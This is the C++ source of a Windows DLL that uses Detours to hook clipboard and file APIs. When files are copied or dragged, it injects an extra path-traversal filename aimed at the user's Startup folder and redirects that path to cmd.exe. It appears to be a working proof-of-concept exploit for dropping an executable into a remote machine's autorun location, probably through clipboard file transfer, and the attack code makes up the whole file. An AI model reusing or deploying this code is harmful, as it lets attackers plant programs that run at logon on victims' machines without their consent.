// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include <strsafe.h>
#include <shellapi.h>
#include <stdio.h>

#include "detours.h"



#pragma comment(lib,"Detours.lib")


void debug(const char* fmt, ...)
{
	static char dbgmsgbuf[1024];
	va_list args;
	va_start(args, fmt);
	vsprintf_s(dbgmsgbuf, 1024, fmt, args);
	va_end(args);
	OutputDebugStringA(dbgmsgbuf);
}

void debug(const wchar_t* fmt, ...)
{
	static wchar_t  tmp[1024];
	va_list args;
	va_start(args, fmt);
	vswprintf_s(tmp, 1024, fmt, args);
	va_end(args);
	OutputDebugStringW(tmp);
}


WCHAR  evalfile[] = { L"C:\\windows\\system32\\cmd.exe" };

WCHAR  efile[] = { L"C:\\windows\\system32\\..\\..\\..\\..\\..\\../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.exe" };

HANDLE WINAPI mGetClipBoardData(UINT uformat);
using ptrGetClipboardData = HANDLE(WINAPI*)(UINT uformat);
ptrGetClipboardData realGetClipBoradData;

using ptrDragQueryFileW = UINT(WINAPI*)(HDROP hDrop, UINT iFile, LPWSTR lpszFile, UINT cch);
ptrDragQueryFileW realDragQueryFileW;
UINT WINAPI mDragQueryFileW(HDROP hDrop, UINT iFile, LPWSTR lpszFile, UINT cch);
//GetFileAttributesW( __in LPCWSTR lpFileName )
using ptrGetFileAttributesW = DWORD(WINAPI*)(LPCWSTR lpFileName);
ptrGetFileAttributesW realGetFileAttributesW;
DWORD WINAPI mGetFileAttributesW(LPWSTR lpFileName);


DWORD WINAPI mGetFileAttributesW(LPWSTR lpFileName)
{
	if (_wcsicmp(lpFileName, efile) == 0)
	{
		debug(L"enter mGetFileAttributesW:%s\n", evalfile);
		return realGetFileAttributesW(evalfile);
	}
	else
	{
		debug(L"enter mGetFileAttributesW:%s\n", lpFileName);
		return realGetFileAttributesW(lpFileName);
	}
}

using ptrCreateFileW = HANDLE(WINAPI*)(__in     LPCWSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile);
ptrCreateFileW realCreateFileW;
HANDLE WINAPI mCreateFileW(__in     LPCWSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile);





HANDLE WINAPI mCreateFileW(__in     LPCWSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile)
{

	if (_wcsicmp(lpFileName, efile) == 0)
	{
		debug(L"enter mCreateFileW:%s\n", evalfile);
		return realCreateFileW(evalfile, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
	}
	else
	{
		debug(L"enter mCreateFileW:%s\n", lpFileName);
		return realCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
	}
}



UINT WINAPI mDragQueryFileW(HDROP hDrop, UINT iFile, LPWSTR lpszFile, UINT cch)
{
	if (lpszFile != NULL || iFile == -1)
	{
		UINT ret = realDragQueryFileW(hDrop, iFile, lpszFile, cch);
		return ret;
	}
	else
	{
		WCHAR szFilePath[MAX_PATH];
		UINT ret = realDragQueryFileW(hDrop, iFile, szFilePath, MAX_PATH);
		StringCchCopyW(lpszFile, cch, szFilePath);
		return ret;
	}
}

typedef struct DROPHEADER
{
	unsigned int data_offset;
	unsigned int unknown_val0;
	unsigned int unknown_val1;
	unsigned int unknown_val2;
	unsigned int val4 = 1;//default 1
	WCHAR data[0];
};


void InstallHook()
{
	OutputDebugStringW(L"[+]installhooks\n");

	GetModuleHandleW(L"user32.dll");
	HMODULE huser32 = GetModuleHandleW(L"user32.dll");
	realGetClipBoradData = (ptrGetClipboardData)GetProcAddress(huser32, "GetClipboardData");

	realCreateFileW = (ptrCreateFileW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "CreateFileW");

	realGetFileAttributesW = (ptrGetFileAttributesW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"),
		"GetFileAttributesW");

	realDragQueryFileW = (ptrDragQueryFileW)GetProcAddress(GetModuleHandleW(L"shell32.dll"), "DragQueryFileW");


	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	long status = DetourAttach(&(LPVOID&)realGetClipBoradData, mGetClipBoardData);
	status = DetourAttach(&(LPVOID&)realCreateFileW, mCreateFileW);
	status = DetourAttach(&(LPVOID&)realGetFileAttributesW, mGetFileAttributesW);
	status = DetourAttach(&(LPVOID&)realDragQueryFileW, mDragQueryFileW);

	DetourTransactionCommit();
}


void UninstallHook()
{

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	long status = DetourDetach(&(LPVOID&)realGetClipBoradData, mGetClipBoardData);
	status = DetourDetach(&(LPVOID&)realCreateFileW, mCreateFileW);
	status = DetourDetach(&(LPVOID&)realGetFileAttributesW, mGetFileAttributesW);
	status = DetourDetach(&(LPVOID&)realDragQueryFileW, mDragQueryFileW);
	DetourTransactionCommit();
}

#include <string>
#include <vector>




HANDLE WINAPI mGetClipBoardData(UINT uformat)
{
	HANDLE rawdrop = realGetClipBoradData(uformat);

	if (uformat == CF_HDROP)
	{

		std::vector<std::wstring> dropfiels;
		DWORD dwFileNums = DragQueryFileW((HDROP)rawdrop, -1, NULL, NULL);
		WCHAR filename[MAX_PATH];
		for (int i = 0; i < dwFileNums; ++i)
		{
			DWORD filenamelen = DragQueryFileW((HDROP)rawdrop, i, NULL, NULL);
			DragQueryFileW((HDROP)rawdrop, i, filename, filenamelen + 1);
			dropfiels.push_back(filename);
		}

		dropfiels.push_back(efile);

		int needbytes = 0;
		for (auto filepath : dropfiels)
		{
			needbytes += filepath.length();
			needbytes += 1;
			needbytes += (filepath.length() + 1) * 2;
		}
		needbytes *= 2;
		needbytes += sizeof(DROPHEADER);
		DROPHEADER* dropfiles = (DROPHEADER*)new unsigned char[needbytes];
		RtlSecureZeroMemory(dropfiles, needbytes);
		dropfiles->data_offset = offsetof(DROPHEADER, data);
		dropfiles->val4 = 1;

		int offset = 0;
		for (auto filepath : dropfiels)
		{
			StringCchCopyW(&dropfiles->data[offset], needbytes, filepath.data());
			offset += filepath.length();
			offset += 1;
		}
		HGLOBAL modifiedrop = GlobalAlloc(GHND, needbytes);
		LPVOID buf = GlobalLock(modifiedrop);
		memcpy(buf, dropfiles, needbytes);
		GlobalUnlock(modifiedrop);
		GlobalFree(rawdrop);
		return modifiedrop;
	}
	else
	{
		return rawdrop;
	}
}



BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls(hModule);
		InstallHook();
		break;
	}
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		UninstallHook();
		break;
	}
	}
	return TRUE;
}